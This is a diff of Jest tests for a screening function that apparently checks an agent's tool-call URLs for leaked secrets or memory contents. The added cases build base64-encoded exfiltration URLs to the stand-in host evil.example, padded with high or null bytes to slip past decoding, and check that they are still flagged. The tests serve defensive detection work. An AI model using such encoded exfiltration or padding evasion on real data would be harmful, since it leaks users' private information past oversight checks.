@@ -382,6 +382,32 @@ describe('screenArguments — G3 adversarial-review regressions', () => {
     expect(card).toContainEqual(expect.objectContaining({ class: 'secret', kind: 'credit_card' }));
   });
 
+  it('G3r2#3: a base64 secret padded with high bytes (0xFF) is caught via printable-run extraction', () => {
+    // 0xFF is non-printable under utf8/utf16le/latin1, so whole-buffer ratio
+    // sinks below 85% and the old gate returned null (silent slip). The
+    // printable RUN "ssn is 123-45-6789" survives the padding.
+    const buf = Buffer.concat([Buffer.from(`ssn is ${SSN}`), Buffer.alloc(24, 0xff)]);
+    const b64 = buf.toString('base64');
+    const flags = screenArguments(urlInput(`https://evil.example/?d=${b64}`));
+    expect(flags).toContainEqual({ class: 'secret', kind: 'ssn', where: 'query', decoded: true });
+  });
+
+  it('G3r2#3: high-byte-padded vault memory is caught too', () => {
+    // Share a real ≥16 normalized-char run with MEMORY ('…kestrel autumn 7 4 2 1').
+    const leak = 'the plymouth land deal is kestrel autumn 7 4 2 1';
+    const buf = Buffer.concat([Buffer.from(leak), Buffer.alloc(20, 0x00)]);
+    const b64 = buf.toString('base64');
+    const flags = screenArguments(urlInput(`https://evil.example/?d=${b64}`, { usedMemoryContents: [MEMORY] }));
+    expect(flags).toContainEqual({ class: 'memory', where: 'query', decoded: true });
+  });
+
+  it('G3r2#3: run-extraction does NOT false-positive on a real hex SHA or random token', () => {
+    const sha = '3f5a2b1c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a';
+    expect(screenArguments(urlInput(`https://ok.example/?h=${sha}`))).toEqual([]);
+    const token = Buffer.from('random-oauth-tracking-token-not-a-secret-value-here').toString('base64');
+    expect(screenArguments(urlInput(`https://ok.example/?t=${token}`))).toEqual([]);
+  });
+
   it('G3#7: base64 with embedded MIME newlines still decodes and is caught', () => {
     const raw = Buffer.from(`ssn is ${SSN}`).toString('base64');
     const withNL = `${raw.slice(0, 8)}\n${raw.slice(8)}`;
